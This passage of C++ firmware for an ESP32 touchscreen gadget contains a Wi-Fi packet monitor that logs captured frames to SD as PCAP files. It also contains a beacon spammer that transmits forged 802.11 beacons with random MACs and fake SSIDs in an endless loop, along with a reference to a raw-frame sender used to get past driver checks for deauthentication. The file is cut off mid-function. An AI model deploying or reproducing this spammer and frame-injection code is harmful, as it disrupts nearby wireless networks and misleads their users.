#include "KeyboardUI.h"
#include "SettingsStore.h"
#include "Touchscreen.h"
#include "config.h"
#include "esp_timer.h"
#include "freertos/FreeRTOS.h"
#include "freertos/queue.h"
#include "freertos/task.h"
#include "icon.h"
#include "shared.h"


namespace Deauther {
  extern void wsl_bypasser_send_raw_frame(const uint8_t *frame_buffer, int size);
}

#ifdef TFT_BLACK
#undef TFT_BLACK
#endif
#define TFT_BLACK FEATURE_BG

#ifndef FEATURE_TEXT
#define FEATURE_TEXT ORANGE
#endif
#ifndef FEATURE_WHITE
#define FEATURE_WHITE 0xFFFF
#endif

#ifdef TFT_WHITE
#undef TFT_WHITE
#endif
#define TFT_WHITE FEATURE_TEXT

#ifdef WHITE
#undef WHITE
#endif
#define WHITE FEATURE_WHITE

#ifdef DARK_GRAY
#undef DARK_GRAY
#endif
#define DARK_GRAY UI_FG

namespace PacketMonitor {

#define MAX_CH 14
#define SNAP_LEN 2324

static constexpr uint32_t PCAP_MAGIC_USEC = 0xa1b2c3d4;
static constexpr uint16_t PCAP_VER_MAJOR = 2;
static constexpr uint16_t PCAP_VER_MINOR = 4;
static constexpr uint32_t PCAP_SNAPLEN   = 65535;
static constexpr uint32_t PCAP_DLT_IEEE802_11_RADIO = 127;

static constexpr uint16_t RADIOTAP_LEN = 19;
static constexpr uint32_t RADIOTAP_PRESENT =
  (1u << 1) |
  (1u << 3) |
  (1u << 5) |
  (1u << 11) |
  (1u << 19);

struct __attribute__((packed)) RadiotapHdr16 {
  uint8_t  it_version;
  uint8_t  it_pad;
  uint16_t it_len;
  uint32_t it_present;
  uint8_t  flags;
  uint8_t  pad2;
  uint16_t chan_freq;
  uint16_t chan_flags;
  int8_t   dbm_antsignal;
  uint8_t  antenna;
  uint8_t  mcs_known;
  uint8_t  mcs_flags;
  uint8_t  mcs;
};

struct __attribute__((packed)) PcapGlobalHeader {
  uint32_t magic_number;
  uint16_t version_major;
  uint16_t version_minor;
  int32_t  thiszone;
  uint32_t sigfigs;
  uint32_t snaplen;
  uint32_t network;
};

struct __attribute__((packed)) PcapRecordHeader {
  uint32_t ts_sec;
  uint32_t ts_usec;
  uint32_t incl_len;
  uint32_t orig_len;
};

static bool  pcapEnabled = false;
static bool  pcapMounted = false;
static File  pcapFile;
static String pcapPath;
static uint32_t pcapPacketsWritten = 0;
static uint32_t pcapDropped = 0;
static uint32_t pcapLastFlushMs = 0;

static constexpr uint8_t PCAP_POOL_SIZE = 10;
struct PcapSlot {
  PcapRecordHeader hdr;
  uint16_t caplen;
  uint8_t  data[SNAP_LEN + RADIOTAP_LEN];
};
static PcapSlot pcapPool[PCAP_POOL_SIZE];
static QueueHandle_t pcapFreeQ = nullptr;
static QueueHandle_t pcapWriteQ = nullptr;

static bool pcapMountSD() {
  if (pcapMounted) {
    if (SD.exists("/")) return true;
    pcapMounted = false;
  }

  #ifdef SD_CD
  pinMode(SD_CD, INPUT_PULLUP);
  if (digitalRead(SD_CD)) return false;
  #endif

  #ifdef SD_SCLK
  #ifdef SD_MISO
  #ifdef SD_MOSI
  #ifdef SD_CS
  SPI.begin(SD_SCLK, SD_MISO, SD_MOSI, SD_CS);
  #endif
  #endif
  #endif
  #endif

  #ifdef SD_CS
  if (SD.begin(SD_CS)) { pcapMounted = true; return true; }
  #endif

  #ifdef SD_CS_PIN
  #ifdef CC1101_CS
  if (SD_CS_PIN != CC1101_CS) {
    if (SD.begin(SD_CS_PIN)) { pcapMounted = true; return true; }
  }
  #else
  if (SD.begin(SD_CS_PIN)) { pcapMounted = true; return true; }
  #endif
  #endif

  return false;
}

static bool pcapEnsureDir(const char* dirPath) {
  if (!pcapMountSD()) return false;
  if (SD.exists(dirPath)) return true;
  if (SD.mkdir(dirPath)) return true;
  if (dirPath && dirPath[0] == '/') return SD.mkdir(dirPath + 1);
  return false;
}

static bool pcapMakeNextPath(String& outPath) {

  for (uint16_t i = 0; i < 10000; i++) {
    char buf[64];
    snprintf(buf, sizeof(buf), "%s/ptm_%04u.pcap", CAPTURE_DIR, (unsigned)i);
    if (!SD.exists(buf)) { outPath = String(buf); return true; }
  }
  return false;
}

static void pcapDisableAndCloseFile() {
  pcapEnabled = false;

  if (pcapWriteQ && pcapFreeQ) {
    uint8_t slotIdx;
    while (xQueueReceive(pcapWriteQ, &slotIdx, 0) == pdTRUE) {
      xQueueSend(pcapFreeQ, &slotIdx, 0);
    }
  }

  if (pcapFile) {
    pcapFile.flush();
    pcapFile.close();
  }
  pcapPath = "";
}

static void pcapStop() {
  pcapDisableAndCloseFile();

  if (pcapWriteQ) { vQueueDelete(pcapWriteQ); pcapWriteQ = nullptr; }
  if (pcapFreeQ)  { vQueueDelete(pcapFreeQ);  pcapFreeQ  = nullptr; }

  pcapPacketsWritten = 0;
  pcapDropped = 0;
  pcapLastFlushMs = 0;
}

static void pcapStart() {

  pcapStop();

  if (!pcapEnsureDir(CAPTURE_DIR)) return;
  if (!pcapMakeNextPath(pcapPath)) return;

  pcapFile = SD.open(pcapPath.c_str(), FILE_WRITE);
  if (!pcapFile) { pcapPath = ""; return; }

  PcapGlobalHeader gh{};
  gh.magic_number = PCAP_MAGIC_USEC;
  gh.version_major = PCAP_VER_MAJOR;
  gh.version_minor = PCAP_VER_MINOR;
  gh.thiszone = 0;
  gh.sigfigs = 0;
  gh.snaplen = PCAP_SNAPLEN;
  gh.network = PCAP_DLT_IEEE802_11_RADIO;
  if (pcapFile.write((const uint8_t*)&gh, sizeof(gh)) != sizeof(gh)) {
    pcapFile.close();
    pcapPath = "";
    return;
  }

  pcapFreeQ = xQueueCreate(PCAP_POOL_SIZE, sizeof(uint8_t));
  pcapWriteQ = xQueueCreate(PCAP_POOL_SIZE, sizeof(uint8_t));
  if (!pcapFreeQ || !pcapWriteQ) {
    pcapStop();
    return;
  }

  for (uint8_t i = 0; i < PCAP_POOL_SIZE; i++) {
    xQueueSend(pcapFreeQ, &i, 0);
  }

  pcapEnabled = true;
  pcapLastFlushMs = millis();
}

static uint16_t pcapChannelToFreqMHz(uint8_t channel) {
  if (channel == 14) return 2484;
  if (channel >= 1 && channel <= 13) return (uint16_t)(2407 + channel * 5);

  if (channel >= 32) return (uint16_t)(5000 + channel * 5);
  return 0;
}

static uint16_t pcapChannelFlags(uint16_t freqMHz) {

  if (freqMHz >= 2400 && freqMHz < 2500) return 0x0080;
  if (freqMHz >= 4900 && freqMHz < 6000) return 0x0100;
  return 0;
}

#define MAX_X 240
#define MAX_Y 320

arduinoFFT FFT = arduinoFFT();

bool btnLeftPressed = false;
bool btnRightPressed = false;

Preferences preferences;

const uint16_t samples = 256;
const double samplingFrequency = 5000;

double attenuation = 10;

unsigned int sampling_period_us;
unsigned long microseconds;

double vReal[samples];
double vImag[samples];

byte palette_red[128], palette_green[128], palette_blue[128];

bool buttonPressed = false;
bool buttonEnabled = true;
uint32_t lastDrawTime;
uint32_t lastButtonTime;
uint32_t tmpPacketCounter;
uint32_t pkts[MAX_X];
uint32_t deauths = 0;
unsigned int ch = 1;
int rssiSum;

unsigned int epoch = 0;
unsigned int color_cursor = 2016;

void do_sampling_FFT() {

  microseconds = micros();

  for (int i = 0; i < samples; i++) {
    vReal[i] = tmpPacketCounter * 300;
    vImag[i] = 1;
    while (micros() - microseconds < sampling_period_us) {

    }
    microseconds += sampling_period_us;
  }

  double mean = 0;

  for (uint16_t i = 0; i < samples; i++)
    mean += vReal[i];
  mean /= samples;
  for (uint16_t i = 0; i < samples; i++)
    vReal[i] -= mean;

  microseconds = micros();

  FFT.Windowing(vReal, samples, FFT_WIN_TYP_HAMMING, FFT_FORWARD);
  FFT.Compute(vReal, vImag, samples, FFT_FORWARD);
  FFT.ComplexToMagnitude(vReal, vImag, samples);

  unsigned int left_x = 120;
  unsigned int graph_y_offset = 91;
  int max_k = 0;

  for (int j = 0; j < samples >> 1; j++) {
    int k = vReal[j] / attenuation;
    if (k > max_k)
      max_k = k;
    if (k > 127) k = 127;

    unsigned int color = palette_red[k] << 11 | palette_green[k] << 5 | palette_blue[k];
    unsigned int vertical_x = left_x + j;

    tft.drawPixel(vertical_x, epoch + graph_y_offset, color);
  }

  for (int j = 0; j < samples >> 1; j++) {
    int k = vReal[j] / attenuation;
    if (k > max_k)
      max_k = k;
    if (k > 127) k = 127;

    unsigned int color = palette_red[k] << 11 | palette_green[k] << 5 | palette_blue[k];
    unsigned int mirrored_x = left_x - j;
    tft.drawPixel(mirrored_x, epoch + graph_y_offset, color);
  }

  unsigned int area_graph_x_offset = 120;
  unsigned int area_graph_height = 50;
  unsigned int area_graph_y_offset = 38;

  static int last_y[samples >> 1] = {0};
  tft.fillRect(area_graph_x_offset, area_graph_y_offset, (samples >> 1), area_graph_height, TFT_BLACK);

  for (int j = 0; j < samples >> 1; j++) {
    int k = vReal[j] / attenuation;
    if (k > 127) k = 127;

    unsigned int color = palette_red[k] << 11 | palette_green[k] << 5 | palette_blue[k];
    int current_y = area_graph_height
              - (int)::map(k, 0, 127, 0, area_graph_height)
              + area_graph_y_offset;
    unsigned int x = area_graph_x_offset + j;

    if (j > 0) {
      tft.fillTriangle(x - 1, area_graph_y_offset + area_graph_height, x, area_graph_y_offset + area_graph_height, x - 1, last_y[j - 1], color);
      tft.fillTriangle(x - 1, last_y[j - 1], x, area_graph_y_offset + area_graph_height, x, current_y, color);
    }
    last_y[j] = current_y;
  }

  unsigned int area_graph_width = (samples >> 1);
  unsigned int area_graph_x_offset_flipped = -7;

  tft.fillRect(area_graph_x_offset_flipped, area_graph_y_offset, area_graph_width, area_graph_height, TFT_BLACK);

  for (int j = 0; j < samples >> 1; j++) {
    int k = vReal[j] / attenuation;
    if (k > 127) k = 127;

    unsigned int color = palette_red[k] << 11 | palette_green[k] << 5 | palette_blue[k];
    int current_y = area_graph_height
              - (int)::map(k, 0, 127, 0, area_graph_height)
              + area_graph_y_offset;
    unsigned int x = area_graph_x_offset_flipped + area_graph_width - j - 1;

    if (j > 0) {
      tft.fillTriangle(x + 1, area_graph_y_offset + area_graph_height, x, area_graph_y_offset + area_graph_height, x + 1, last_y[j - 1], color);
      tft.fillTriangle(x + 1, last_y[j - 1], x, area_graph_y_offset + area_graph_height, x, current_y, color);
    }
    last_y[j] = current_y;
  }

  double tattenuation = max_k / 127.0;

  if (tattenuation > attenuation)
    attenuation = tattenuation;

  tft.setTextColor(TFT_WHITE);
  tft.setTextSize(1);
  tft.setTextFont(1);

  tft.fillRect(30, 20, 130, 16, DARK_GRAY);

  tft.setCursor(35, 24);
  tft.print("Ch:");
  tft.print(ch);

  tft.setCursor(80, 24);
  tft.print("Packet:");
  tft.print(tmpPacketCounter);

  delay(10);
}

esp_err_t event_handler(void* ctx, system_event_t* event) {
  return ESP_OK;
}

double getMultiplicator() {
  uint32_t maxVal = 1;
  for (int i = 0; i < MAX_X; i++) {
    if (pkts[i] > maxVal) maxVal = pkts[i];
  }
  if (maxVal > MAX_Y) return (double)MAX_Y / (double)maxVal;
  else return 1;
}

void wifi_promiscuous(void* buf, wifi_promiscuous_pkt_type_t type) {
  wifi_promiscuous_pkt_t* pkt = (wifi_promiscuous_pkt_t*)buf;
  wifi_pkt_rx_ctrl_t ctrl = (wifi_pkt_rx_ctrl_t)pkt->rx_ctrl;

  if (type == WIFI_PKT_MGMT && (pkt->payload[0] == 0xA0 || pkt->payload[0] == 0xC0 )) deauths++;

  if (type == WIFI_PKT_MISC) return;
  if (ctrl.sig_len > SNAP_LEN) return;

  const uint16_t packetLength = (uint16_t)ctrl.sig_len;
  tmpPacketCounter++;
  rssiSum += ctrl.rssi;

  if (!pcapEnabled || !pcapFile || !pcapFreeQ || !pcapWriteQ) return;

  uint8_t slotIdx;
  if (xQueueReceive(pcapFreeQ, &slotIdx, 0) != pdTRUE) {
    pcapDropped++;
    return;
  }

  if (slotIdx >= PCAP_POOL_SIZE) {

    pcapDropped++;
    return;
  }

  PcapSlot& s = pcapPool[slotIdx];

  const int64_t nowUs = esp_timer_get_time();
  s.hdr.ts_sec  = (uint32_t)(nowUs / 1000000LL);
  s.hdr.ts_usec = (uint32_t)(nowUs % 1000000LL);

  const uint16_t freq = pcapChannelToFreqMHz((uint8_t)ctrl.channel);
  RadiotapHdr16 rt{};
  rt.it_version = 0;
  rt.it_pad = 0;
  rt.it_len = RADIOTAP_LEN;
  rt.it_present = RADIOTAP_PRESENT;
  rt.flags = 0;
  rt.pad2 = 0;
  rt.chan_freq = freq;
  rt.chan_flags = pcapChannelFlags(freq);
  rt.dbm_antsignal = (int8_t)ctrl.rssi;
  rt.antenna = 0;
  rt.mcs_known = 0;
  rt.mcs_flags = 0;
  rt.mcs = 0;

  if (ctrl.sig_mode == 1) {

    rt.mcs_known =
      (1u << 0) |
      (1u << 1) |
      (1u << 2) |
      (1u << 4) |
      (1u << 5);

    const uint8_t bw = (ctrl.cwb ? 1 : 0);
    rt.mcs_flags |= (bw & 0x3);
    if (ctrl.sgi) rt.mcs_flags |= (1u << 2);
    if (ctrl.fec_coding) rt.mcs_flags |= (1u << 4);
    if (ctrl.stbc) rt.mcs_flags |= (1u << 5);

    rt.mcs = ctrl.mcs;
  }

  const uint16_t totalLen = (uint16_t)(RADIOTAP_LEN + packetLength);
  s.hdr.incl_len = totalLen;
  s.hdr.orig_len = totalLen;
  s.caplen = totalLen;
  memcpy(s.data, &rt, RADIOTAP_LEN);
  memcpy(s.data + RADIOTAP_LEN, pkt->payload, packetLength);

  if (xQueueSend(pcapWriteQ, &slotIdx, 0) != pdTRUE) {

    xQueueSend(pcapFreeQ, &slotIdx, 0);
    pcapDropped++;
    return;
  }
}

void setChannel(int newChannel) {
  ch = newChannel;
  if (ch > MAX_CH || ch < 1) ch = 1;

  preferences.begin("packetmonitor32", false);
  preferences.putUInt("channel", ch);
  preferences.end();

  esp_wifi_set_promiscuous(false);
  esp_wifi_set_channel(ch, WIFI_SECOND_CHAN_NONE);
  esp_wifi_set_promiscuous_rx_cb(&wifi_promiscuous);
  esp_wifi_set_promiscuous(true);
}

void draw() {
  double multiplicator = getMultiplicator();
  int len;
  int rssi;

  if (pkts[MAX_X - 1] > 0) rssi = rssiSum / (int)pkts[MAX_X - 1];
  else rssi = rssiSum;
}

static bool uiDrawn = false;

void runUI() {
#define SCREEN_WIDTH  240
#define SCREEN_HEIGHT 320
#define STATUS_BAR_Y_OFFSET 20
#define STATUS_BAR_HEIGHT 16
#define ICON_SIZE 16
#define ICON_NUM 3

  static int iconX[ICON_NUM] = {170, 210, 10};
  static int iconY = STATUS_BAR_Y_OFFSET;

  static const unsigned char* icons[ICON_NUM] = {
    bitmap_icon_sort_up_plus,
    bitmap_icon_sort_down_minus,
    bitmap_icon_go_back
  };

  if (!uiDrawn) {
    tft.fillRect(160, STATUS_BAR_Y_OFFSET, SCREEN_WIDTH - 160, STATUS_BAR_HEIGHT, DARK_GRAY);
    for (int i = 0; i < ICON_NUM; i++) {
      if (icons[i] != NULL) {
        tft.drawBitmap(iconX[i], iconY, icons[i], ICON_SIZE, ICON_SIZE, TFT_WHITE);
      }
    }
    tft.drawLine(0, STATUS_BAR_Y_OFFSET + STATUS_BAR_HEIGHT, SCREEN_WIDTH, STATUS_BAR_Y_OFFSET + STATUS_BAR_HEIGHT, ORANGE);
    uiDrawn = true;
  }

  static unsigned long lastAnimationTime = 0;
  static int animationState = 0;
  static int activeIcon = -1;

  if (animationState > 0 && millis() - lastAnimationTime >= 150) {
    if (animationState == 1) {
      tft.drawBitmap(iconX[activeIcon], iconY, icons[activeIcon], ICON_SIZE, ICON_SIZE, TFT_WHITE);
      animationState = 2;
    } else if (animationState == 2) {
      animationState = 0;
      activeIcon = -1;
    }
    lastAnimationTime = millis();
  }

  static unsigned long lastTouchCheck = 0;
  const unsigned long touchCheckInterval = 50;

  if (millis() - lastTouchCheck >= touchCheckInterval) {
    int x, y;
    if (feature_active && readTouchXY(x, y)) {
      if (y > STATUS_BAR_Y_OFFSET && y < STATUS_BAR_Y_OFFSET + STATUS_BAR_HEIGHT) {
        for (int i = 0; i < ICON_NUM; i++) {
          if (x > iconX[i] && x < iconX[i] + ICON_SIZE) {
            if (icons[i] != NULL && animationState == 0) {

              if (i == 2) {
                feature_exit_requested = true;
              } else {

                tft.drawBitmap(iconX[i], iconY, icons[i], ICON_SIZE, ICON_SIZE, TFT_BLACK);
                animationState = 1;
                activeIcon = i;
                lastAnimationTime = millis();

                switch (i) {
                  case 0: setChannel(ch + 1); break;
                  case 1: setChannel(ch - 1); break;
                }
              }
            }
            break;
          }
        }
      }
    }
    lastTouchCheck = millis();
  }
}

void ptmSetup() {
  Serial.begin(115200);

  pcf.pinMode(BTN_UP, INPUT_PULLUP);
  pcf.pinMode(BTN_DOWN, INPUT_PULLUP);
  pcf.pinMode(BTN_LEFT, INPUT_PULLUP);
  pcf.pinMode(BTN_RIGHT, INPUT_PULLUP);

  tft.fillScreen(TFT_BLACK);

  setupTouchscreen();

  sampling_period_us = round(1000000 * (1.0 / samplingFrequency));

  for (int i = 0; i < 32; i++) {
    palette_red[i] = i / 2;
    palette_green[i] = 0;
    palette_blue[i] = i;
  }
  for (int i = 32; i < 64; i++) {
    palette_red[i] = i / 2;
    palette_green[i] = 0;
    palette_blue[i] = 63 - i;
  }
  for (int i = 64; i < 96; i++) {
    palette_red[i] = 31;
    palette_green[i] = (i - 64) * 2;
    palette_blue[i] = 0;
  }
  for (int i = 96; i < 128; i++) {
    palette_red[i] = 31;
    palette_green[i] = 63;
    palette_blue[i] = i - 96;
  }

  sampling_period_us = round(1000000 * (1.0 / samplingFrequency));

  preferences.begin("packetmonitor32", false);
  ch = preferences.getUInt("channel", 1);
  preferences.end();

  nvs_flash_init();
  tcpip_adapter_init();
  wifi_init_config_t cfg = WIFI_INIT_CONFIG_DEFAULT();

  ESP_ERROR_CHECK(esp_wifi_init(&cfg));

  ESP_ERROR_CHECK(esp_wifi_set_storage(WIFI_STORAGE_RAM));
  ESP_ERROR_CHECK(esp_wifi_set_mode(WIFI_MODE_NULL));
  ESP_ERROR_CHECK(esp_wifi_start());

  float currentBatteryVoltage = readBatteryVoltage();
  drawStatusBar(currentBatteryVoltage, true);

  uiDrawn = false;
  tft.fillRect(0, 20, 160, 16, DARK_GRAY);

  pcapStart();
  if (pcapEnabled && pcapPath.length()) {
    Serial.printf("[PCAP] PacketMonitor logging to SD: %s\n", pcapPath.c_str());
  } else {
    Serial.println("[PCAP] PacketMonitor: SD/PCAP logging not started (no SD or open failed).");
  }
}

void ptmLoop() {

  if (feature_active && isButtonPressed(BTN_SELECT)) {

    esp_wifi_set_promiscuous(false);
    if (pcapPacketsWritten || pcapDropped) {
      Serial.printf("[PCAP] PacketMonitor stopped. written=%lu dropped=%lu\n",
                    (unsigned long)pcapPacketsWritten, (unsigned long)pcapDropped);
    }
    pcapStop();
    feature_exit_requested = true;
    return;
  }

  runUI();
  if (feature_exit_requested) {
    esp_wifi_set_promiscuous(false);
    if (pcapPacketsWritten || pcapDropped) {
      Serial.printf("[PCAP] PacketMonitor stopped. written=%lu dropped=%lu\n",
                    (unsigned long)pcapPacketsWritten, (unsigned long)pcapDropped);
    }
    pcapStop();
    return;
  }
  updateStatusBar();

  esp_wifi_set_channel(ch, WIFI_SECOND_CHAN_NONE);

  esp_wifi_set_promiscuous_rx_cb(&wifi_promiscuous);
  esp_wifi_set_promiscuous(true);

  if (pcapEnabled && pcapFile && pcapWriteQ && pcapFreeQ) {
    uint8_t slotIdx;

    uint16_t drained = 0;
    while (drained < 12 && xQueueReceive(pcapWriteQ, &slotIdx, 0) == pdTRUE) {
      if (slotIdx < PCAP_POOL_SIZE) {
        PcapSlot& s = pcapPool[slotIdx];
        const size_t wroteHdr = pcapFile.write((const uint8_t*)&s.hdr, sizeof(s.hdr));
        const size_t wrotePkt = pcapFile.write(s.data, s.caplen);
        if (wroteHdr == sizeof(s.hdr) && wrotePkt == s.caplen) {
          pcapPacketsWritten++;
        } else {

          pcapDisableAndCloseFile();
        }
      }
      xQueueSend(pcapFreeQ, &slotIdx, 0);
      drained++;
    }

    const uint32_t now = millis();
    if (pcapFile && (now - pcapLastFlushMs) > 1000) {
      pcapFile.flush();
      pcapLastFlushMs = now;
    }
  }

  tft.drawLine(0, 90, 240, 90, TFT_WHITE);
  tft.drawLine(0, 19, 240, 19, TFT_WHITE);

  do_sampling_FFT();
  delay(10);
  epoch++;

  if (epoch >= tft.width())
    epoch = 0;

  static uint32_t lastButtonTime = 0;
  const uint32_t debounceDelay = 200;

  bool leftButtonState = !pcf.digitalRead(BTN_LEFT);
  bool rightButtonState = !pcf.digitalRead(BTN_RIGHT);

  uint32_t currentTime = millis();

  if (leftButtonState && !btnLeftPressed && (currentTime - lastButtonTime > debounceDelay)) {
    btnLeftPressed = true;
    setChannel(ch - 1);
    lastButtonTime = currentTime;
  } else if (!leftButtonState) {
    btnLeftPressed = false;
  }

  if (rightButtonState && !btnRightPressed && (currentTime - lastButtonTime > debounceDelay)) {
    btnRightPressed = true;
    setChannel(ch + 1);
    lastButtonTime = currentTime;
  } else if (!rightButtonState) {
    btnRightPressed = false;
  }

  pkts[127] = tmpPacketCounter;

  tmpPacketCounter = 0;
  deauths = 0;
  rssiSum = 0;
  }
}

namespace BeaconSpammer {

bool btnLeftPress;
bool btnRightPress;
bool btnSelectPress;

String ssidList[] = {
  "404_SSID_Not_Found", "Free_WiFi_Promise", "PrettyFlyForAWiFi", "Wi-Fight_The_Power",
  "Tell_My_WiFi_LoveHer", "Wu-Tang_LAN", "LAN_of_the_Free", "No_More_Data",
  "Panic!_At_the_WiFi", "HideYoKidsHideYoWiFi", "Definitely_Not_A_Spy", "Click_and_Die",
  "DropItLikeItsHotspot", "Loading...", "I_AM_Watching_You", "Why_Tho?",
  "Get_Your_Own_WiFi", "NSA_Surveillance_Van", "WiFi_Fairy", "Undercover_Potato",
  "TheLANBeforeTime", "ItHurtsWhen_IP", "IPFreely", "NoInternetHere",
  "LookMaNoCables", "Router?IHardlyKnewHer", "ShutUpAndConnect", "Mom_UseThisOne",
  "Not_for_You", "OopsAllSSID", "ItsOver9000", "Bob's_Wifi_Burgers",
  "Overclocked_Toaster", "Pikachu_Used_WiFi", "Cheese_Bandit", "Quantum_Tunnel",
  "Meme_LANd"
};

const int ssidCount = sizeof(ssidList) / sizeof(ssidList[0]);

uint8_t spamchannel = 1;
bool    spam        = false;
int     y_offset    = 20;

static uint8_t lastSpamChannel = 0xFF;
static bool    lastSpamState   = !false;

uint8_t packet[128] = {0x80, 0x00, 0x00, 0x00,
                       0xff, 0xff, 0xff, 0xff, 0xff, 0xff,
                       0x01, 0x02, 0x03, 0x04, 0x05, 0x06,
                       0x01, 0x02, 0x03, 0x04, 0x05, 0x06,
                       0xc0, 0x6c,
                       0x83, 0x51, 0xf7, 0x8f, 0x0f, 0x00, 0x00, 0x00,
                       0x64, 0x00,
                       0x01, 0x04,
                       0x00, 0x06, 0x72, 0x72, 0x72, 0x72, 0x72, 0x72,
                       0x01, 0x08, 0x82, 0x84,
                       0x8b, 0x96, 0x24, 0x30, 0x48, 0x6c, 0x03, 0x01,
                       0x04
                      };

void handleLeftButton() {
  spamchannel = (spamchannel == 1) ? 14 : spamchannel - 1;
}

void handleRightButton() {
  spamchannel = (spamchannel == 14) ? 1 : spamchannel + 1;
}

void handleSelectButton() {
  spam = !spam;
}

void output() {

  tft.fillRect(0, 40, tft.width(), tft.height(), TFT_BLACK);

  tft.setTextFont(1);
  tft.setTextSize(1);
  tft.setTextColor(TFT_YELLOW, TFT_BLACK);
  tft.setCursor(2, 30 + y_offset);
  tft.print("[!] Preparing");

  for (int i = 0; i < 3; i++) {
    tft.print(".");
    delay(random(1000));
  }

  tft.setCursor(2, 50 + y_offset);
  tft.setTextColor(TFT_CYAN, TFT_BLACK);
  tft.print("[*] Configuring channel to ");
  tft.setTextColor(TFT_CYAN, TFT_BLACK);
  tft.print("(");
  tft.setTextColor(UI_WARN, TFT_BLACK);
  tft.print(spamchannel);
  tft.setTextColor(TFT_CYAN, TFT_BLACK);
  tft.print(")");
  delay(random(500));

  tft.setCursor(2, 70 + y_offset);
  tft.setTextColor(TFT_YELLOW, TFT_BLACK);
  tft.print("[!] SSID generated successfully");
  delay(random(500));

  tft.setCursor(2, 80 + y_offset);
  tft.setTextColor(TFT_YELLOW, TFT_BLACK);
  tft.print("[!] Setting random SRC MAC");
  delay(random(500));

  tft.setCursor(2, 110 + y_offset);
  tft.setTextColor(TFT_CYAN, TFT_BLACK);
  tft.print("[*] Starting broadcast");
  delay(random(500));

  for (int i = 0; i < 18; i++) {
    tft.setCursor(2, 130 + i * 10 + y_offset);
    String randomSSID = ssidList[random(ssidCount)];
    tft.setTextColor(TFT_WHITE, TFT_BLACK);
    tft.print("[+] ");
    tft.print(randomSSID);
    delay(random(500));
  }
}

void spammer() {
  esp_wifi_set_channel(spamchannel, WIFI_SECOND_CHAN_NONE);

  for (int i = 10; i <= 21; i++) {
    packet[i] = random(256);
  }

  String randomSSID = ssidList[random(ssidCount)];
  int ssidLength = randomSSID.length();
  packet[37] = ssidLength;

  for (int i = 0; i < ssidLength; i++) {
    packet[38 + i] = randomSSID[i];
  }

  for (int i = 38 + ssidLength; i <= 43; i++) {
    packet[i] = 0x00;
  }

  packet[56] = spamchannel;

  esp_wifi_80211_tx(WIFI_IF_AP, packet, 57, false);

  delay(1);
}

void beaconSpam() {
    String ssid = "1234567890qwertyuiopasdfghjkklzxcvbnm QWERTYUIOPASDFGHJKLZXCVBNM_";
    byte channel;

    uint8_t packet[128] = { 0x80, 0x00, 0x00, 0x00,
                            0xff, 0xff, 0xff, 0xff, 0xff, 0xff,
                            0x01, 0x02, 0x03, 0x04, 0x05, 0x06,
                            0x01, 0x02, 0x03, 0x04, 0x05, 0x06,
                            0xc0, 0x6c,
                            0x83, 0x51, 0xf7, 0x8f, 0x0f, 0x00, 0x00, 0x00,
                            0x64, 0x00,
                            0x01, 0x04,
                            0x00, 0x06, 0x72, 0x72, 0x72, 0x72, 0x72, 0x72,
                            0x01, 0x08, 0x82, 0x84,
                            0x8b, 0x96, 0x24, 0x30, 0x48, 0x6c, 0x03, 0x01,
                            0x04};

    tft.setTextFont(1);
    tft.setTextSize(1);
    tft.setTextColor(UI_WARN, TFT_BLACK);
    tft.fillRect(0, 40, tft.width(), tft.height(), TFT_BLACK);
    tft.setCursor(2, 30 + y_offset);
    tft.print("[!!] FUCK IT");
    tft.setCursor(2, 50 + y_offset);
    tft.print("[!!] Press [Select] to exit");

    delay(500);

    wifi_init_config_t cfg = WIFI_INIT_CONFIG_DEFAULT();
    esp_err_t err = esp_wifi_init(&cfg);
    if (err != ESP_OK) {
        Serial.printf("WiFi init failed: %d\n", err);
        return;
    }

    err = esp_wifi_set_storage(WIFI_STORAGE_RAM);
    if (err != ESP_OK) {
        Serial.printf("Storage set failed: %d\n", err);
        return;
    }

    err = esp_wifi_set_mode(WIFI_MODE_AP);
    if (err != ESP_OK) {
        Serial.printf("Mode set failed: %d\n", err);
        return;
    }

    err = esp_wifi_start();
    if (err != ESP_OK) {
        Serial.printf("WiFi start failed: %d\n", err);
        return;
    }

    err = esp_wifi_set_promiscuous(true);
    if (err != ESP_OK) {
        Serial.printf("Promiscuous set failed: %d\n", err);
        return;
    }

    while (true) {
        channel = random(1, 13);
        esp_wifi_set_channel(channel, WIFI_SECOND_CHAN_NONE);

        for (int i = 10; i <= 15; i++) {
            packet[i] = random(256);
        }
        for (int i = 16; i <= 21; i++) {
            packet[i] = random(256);
        }

        packet[38] = ssid[random(65)];
        packet[39] = ssid[random(65)];
        packet[40] = ssid[random(65)];
        packet[41] = ssid[random(65)];
        packet[42] = ssid[random(65)];
        packet[43] = ssid[random(65)];

        packet[56] = channel;

        esp_err_t result;
        result = esp_wifi_80211_tx(WIFI_IF_AP, packet, 57, false);
        if (result != ESP_OK) {
            Serial.printf("Packet 1 send failed: %d\n", result);
        }
        result = esp_wifi_80211_tx(WIFI_IF_AP, packet, 57, false);
        if (result != ESP_OK) {
            Serial.printf("Packet 2 send failed: %d\n", result);
        }
        result = esp_wifi_80211_tx(WIFI_IF_AP, packet, 57, false);
        if (result != ESP_OK) {
            Serial.printf("Packet 3 send failed: %d\n", result);
        }

        delay(1);

      if (pcf.digitalRead(BTN_SELECT) == LOW) {
        break;
      }

    }
}

static bool uiDrawn = false;

void runUI() {
#define SCREEN_WIDTH  240
#define SCREENHEIGHT 320
#define STATUS_BAR_Y_OFFSET 20
#define STATUS_BAR_HEIGHT 16
#define ICON_SIZE 16
#define ICON_NUM 5

  static int iconX[ICON_NUM] = {130, 160, 190, 220, 10};
  static int iconY = STATUS_BAR_Y_OFFSET;

  static const unsigned char* icons[ICON_NUM] = {
    bitmap_icon_sort_down_minus,
    bitmap_icon_sort_up_plus,
    bitmap_icon_start,
    bitmap_icon_nuke,
    bitmap_icon_go_back
  };

  if (!uiDrawn) {
    tft.fillRect(120, STATUS_BAR_Y_OFFSET, SCREEN_WIDTH - 120, STATUS_BAR_HEIGHT, DARK_GRAY);
    for (int i = 0; i < ICON_NUM; i++) {
      if (icons[i] != NULL) {
        tft.drawBitmap(iconX[i], iconY, icons[i], ICON_SIZE, ICON_SIZE, TFT_WHITE);
      }
    }
    tft.drawLine(0, STATUS_BAR_Y_OFFSET + STATUS_BAR_HEIGHT, SCREEN_WIDTH, STATUS_BAR_Y_OFFSET + STATUS_BAR_HEIGHT, ORANGE);
    uiDrawn = true;
  }

  static unsigned long lastAnimationTime = 0;
  static int animationState = 0;
  static int activeIcon = -1;
  static unsigned long lastSpamTime = 0;

  switch (animationState) {
    case 0:
      break;

    case 1:
      if (millis() - lastAnimationTime >= 150) {
